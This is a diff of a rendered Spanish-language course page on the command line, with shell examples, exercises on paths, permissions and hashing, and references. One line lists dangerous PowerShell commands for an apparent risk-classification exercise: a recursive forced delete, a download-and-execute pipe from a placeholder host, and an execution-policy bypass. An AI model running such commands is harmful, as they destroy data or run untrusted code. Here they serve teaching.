+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="at">-rn</span> <span class="st">"TODO"</span> <span class="at">--include</span><span class="op">=</span><span class="st">"*.md"</span> <span class="at">--include</span><span class="op">=</span><span class="st">"*.qmd"</span> <span class="at">--include</span><span class="op">=</span><span class="st">"*.txt"</span> .</span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="fu">wc</span> <span class="at">-l</span> datos/aceleracion.csv</span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> <span class="at">-1</span> <span class="st">"notas de campo.txt"</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb30"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Force</span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Recurse <span class="op">-</span>Include <span class="op">*.</span><span class="fu">qmd</span><span class="op">,*.</span><span class="fu">py</span> <span class="op">-</span>File</span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Recurse <span class="op">-</span>File <span class="op">-</span>Include <span class="op">*.</span><span class="fu">md</span><span class="op">,*.</span><span class="fu">qmd</span><span class="op">,*.</span><span class="fu">txt</span> <span class="op">|</span> <span class="fu">Select-String</span> <span class="op">-</span>Pattern <span class="st">"TODO"</span></span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">Get-Content</span> datos<span class="op">/</span>aceleracion<span class="op">.</span><span class="fu">csv</span> <span class="op">|</span> <span class="fu">Measure-Object</span> <span class="op">-</span>Line<span class="op">).</span><span class="fu">Lines</span></span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-Content</span> <span class="op">-</span>LiteralPath <span class="st">"notas de campo.txt"</span> <span class="op">-</span>TotalCount <span class="dv">1</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p>No deben versionarse <code>resultados/</code>, <code>_salida/</code>, <code>.venv/</code>, <code>__pycache__/</code> y <code>.env</code> (salidas generadas, entorno y secretos). <code>.env.ejemplo</code> sí: es una plantilla con valores falsos.</p>
 </div>
 </div>
@@ -1446,7 +1551,7 @@ window.Quarto = {
 </table>
 <p>Y en PowerShell: <code>Remove-Item -Recurse -Force *</code> (9) · <code>iwr https://ejemplo.invalid/a.ps1 \| iex</code> (10) · <code>Set-ExecutionPolicy Bypass -Scope LocalMachine</code> (11).</p>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución razonada">
-<div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-8-contents" aria-controls="callout-8" aria-expanded="false" aria-label="Toggle callout">
+<div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-9-contents" aria-controls="callout-9" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
 <i class="callout-icon"></i>
 </div>
@@ -1455,7 +1560,7 @@ window.Quarto = {
 </div>
 <div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
 </div>
-<div id="callout-8" class="callout-8-contents callout-collapse collapse">
+<div id="callout-9" class="callout-9-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
 <ol type="1">
 <li><strong>A.</strong> Solo lee.</li>
@@ -1503,23 +1608,6 @@ window.Quarto = {
 <ol type="1">
 <li><p><strong>Rutas.</strong> Desde <code>/Users/ana/proyecto-viga/tests</code>, escribe la ruta relativa a <code>datos/aceleracion.csv</code> y la absoluta.</p>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución">
-<div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-10-contents" aria-controls="callout-10" aria-expanded="false" aria-label="Toggle callout">
-<div class="callout-icon-container">
-<i class="callout-icon"></i>
-</div>
-<div class="callout-title-container flex-fill">
-<span class="screen-reader-only">Nota</span>Solución
-</div>
-<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
-</div>
-<div id="callout-10" class="callout-10-contents callout-collapse collapse">
-<div class="callout-body-container callout-body">
-<p>Relativa: <code>../datos/aceleracion.csv</code>. Absoluta: <code>/Users/ana/proyecto-viga/datos/aceleracion.csv</code>.</p>
-</div>
-</div>
-</div></li>
-<li><p><strong>Permisos.</strong> Un script tiene modo 644. Necesitas poder ejecutarlo tú, y nadie más. ¿Qué orden usas y qué modo octal queda?</p>
-<div class="callout callout-style-default callout-note callout-titled" title="Solución">
 <div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-11-contents" aria-controls="callout-11" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
 <i class="callout-icon"></i>
@@ -1531,11 +1619,11 @@ window.Quarto = {
 </div>
 <div id="callout-11" class="callout-11-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<p><code>chmod u+x script</code> → <code>rwxr--r--</code> = <strong>744</strong> (el grupo y los demás siguen pudiendo leerlo). Si quieres que solo tú lo leas, <code>chmod 700</code>.</p>
+<p>Relativa: <code>../datos/aceleracion.csv</code>. Absoluta: <code>/Users/ana/proyecto-viga/datos/aceleracion.csv</code>.</p>
 </div>
 </div>
 </div></li>
-<li><p><strong>Hash.</strong> Descarga o copia un fichero y comprueba su SHA-256 antes y después. ¿Qué ocurre con la huella si cambias una sola coma del fichero?</p>
+<li><p><strong>Permisos.</strong> Un script tiene modo 644. Necesitas poder ejecutarlo tú, y nadie más. ¿Qué orden usas y qué modo octal queda?</p>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución">
 <div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-12-contents" aria-controls="callout-12" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1548,12 +1636,11 @@ window.Quarto = {
 </div>
 <div id="callout-12" class="callout-12-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<p>Cambia por completo (efecto avalancha). Por eso una huella igual indica un fichero idéntico.</p>
+<p><code>chmod u+x script</code> → <code>rwxr--r--</code> = <strong>744</strong> (el grupo y los demás siguen pudiendo leerlo). Si quieres que solo tú lo leas, <code>chmod 700</code>.</p>
 </div>
 </div>
 </div></li>
-<li><p><strong>Script.</strong> Escribe un script (Zsh o PowerShell) que reciba un <code>.csv</code>, compruebe que existe, imprima su número de líneas y termine con código 2 si no existe. Pruébalo con un fichero que exista y otro que no.</p></li>
-<li><p><strong>Resolución de picos.</strong> Con el proyecto de ejemplo, ¿cuánto vale la separación entre bins <span class="math inline">\(\Delta f=f_s/N\)</span>? ¿Distinguirías con estos datos dos modos separados 0,05 Hz? Razona.</p>
+<li><p><strong>Hash.</strong> Descarga o copia un fichero y comprueba su SHA-256 antes y después. ¿Qué ocurre con la huella si cambias una sola coma del fichero?</p>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución">
 <div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-13-contents" aria-controls="callout-13" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
@@ -1565,6 +1652,24 @@ window.Quarto = {
 <div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
 </div>
 <div id="callout-13" class="callout-13-contents callout-collapse collapse">
+<div class="callout-body-container callout-body">
+<p>Cambia por completo (efecto avalancha). Por eso una huella igual indica un fichero idéntico.</p>
+</div>
+</div>
+</div></li>
+<li><p><strong>Script.</strong> Escribe un script (Zsh o PowerShell) que reciba un <code>.csv</code>, compruebe que existe, imprima su número de líneas y termine con código 2 si no existe. Pruébalo con un fichero que exista y otro que no.</p></li>
+<li><p><strong>Resolución de picos.</strong> Con el proyecto de ejemplo, ¿cuánto vale la separación entre bins <span class="math inline">\(\Delta f=f_s/N\)</span>? ¿Distinguirías con estos datos dos modos separados 0,05 Hz? Razona.</p>
+<div class="callout callout-style-default callout-note callout-titled" title="Solución">
+<div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-14-contents" aria-controls="callout-14" aria-expanded="false" aria-label="Toggle callout">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<div class="callout-title-container flex-fill">
+<span class="screen-reader-only">Nota</span>Solución
+</div>
+<div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
+</div>
+<div id="callout-14" class="callout-14-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
 <p><span class="math inline">\(\Delta f=200/2048\approx 0{,}0977\)</span> Hz. Dos modos a 0,05 Hz de distancia son menos que el paso del eje y, además, la resolución efectiva es peor que <span class="math inline">\(\Delta f\)</span> por la ventana: <strong>no</strong> se distinguirían (C0, recuadro avanzado).</p>
 </div>
@@ -1588,8 +1693,25 @@ window.Quarto = {
 </section>
 <section id="referencias-de-esta-unidad" class="level2">
 <h2 class="anchored" data-anchor-id="referencias-de-esta-unidad">Referencias de esta unidad</h2>
-<p>Documentación consultada el 23-10-2026: <a href="https://docs.brew.sh/Manpage">Homebrew, manual de <code>brew</code></a>, <a href="https://learn.microsoft.com/en-us/windows/package-manager/winget/install">Microsoft Learn: <code>winget install</code></a>, <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies">about_Execution_Policies</a>, <a href="https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/register-scheduledtask">Register-ScheduledTask</a> y la <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html">guía archivada de Apple sobre launchd</a> (2016; contrastada con <code>man launchctl</code> en macOS 27.0.1). El libro <em>Linux Basics for Hackers</em> (OccupyTheWeb) solo se ha usado como referencia temática para elegir qué conceptos incluir; todo el texto, los ejemplos y los datos de esta unidad son originales.</p>
+<p>Documentación consultada el 23-10-2026: <a href="https://docs.brew.sh/Manpage">Homebrew, manual de <code>brew</code></a>, <a href="https://learn.microsoft.com/en-us/windows/package-manager/winget/install">Microsoft Learn: <code>winget install</code></a>, <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies">about_Execution_Policies</a>, <a href="https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/register-scheduledtask">Register-ScheduledTask</a> y la <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html">guía archivada de Apple sobre launchd</a> (2016; contrastada con <code>man launchctl</code> en macOS 27.0.1). Documentación de Claude Code consultada el 25-11-2026: <a href="https://code.claude.com/docs/en/setup">instalación y actualización</a>, <a href="https://code.claude.com/docs/en/troubleshoot-install">problemas de instalación</a> y <a href="https://code.claude.com/docs/en/vs-code">extensión para VS Code</a>. El libro <em>Linux Basics for Hackers</em> (OccupyTheWeb) solo se ha usado como referencia temática para elegir qué conceptos incluir; todo el texto, los ejemplos y los datos de esta unidad son originales.</p>
 
+
+</section>
+<section id="referencias-unidad" class="level2 unnumbered">
+<h2 class="unnumbered anchored" data-anchor-id="referencias-unidad">Referencias</h2>
+<p><em>Son las mismas que aparecen en el margen, junto al texto.</em> La lista completa del curso, con el estado de verificación de cada ficha, está en <code>recursos/bibliografia.bib</code> del repositorio.</p>
+<div id="refs-unidad" class="referencias-unidad">
+<div class="ref-final">
+<p><em>Changelog</em>. 2026. Documentación de Claude Code (Anthropic) y CHANGELOG.md de anthropics/claude-code, consultados el 25-11-2026. <a href="https://code.claude.com/docs/en/changelog">https://code.claude.com/docs/en/changelog</a>.</p>
+</div>
+<div class="ref-final">
+<p><em>CLI reference</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 25-11-2026. <a href="https://code.claude.com/docs/en/cli-reference">https://code.claude.com/docs/en/cli-reference</a>.</p>
+</div>
+</div>
+<script>(function(){var a=document.getElementById('toc-bibliography');if(a&&a.parentElement)a.parentElement.remove();})();</script>
+</section>
+<section id="bibliography" class="level1 unnumbered">
+<h1 class="unnumbered">Referencias</h1>
 
 </section>
 
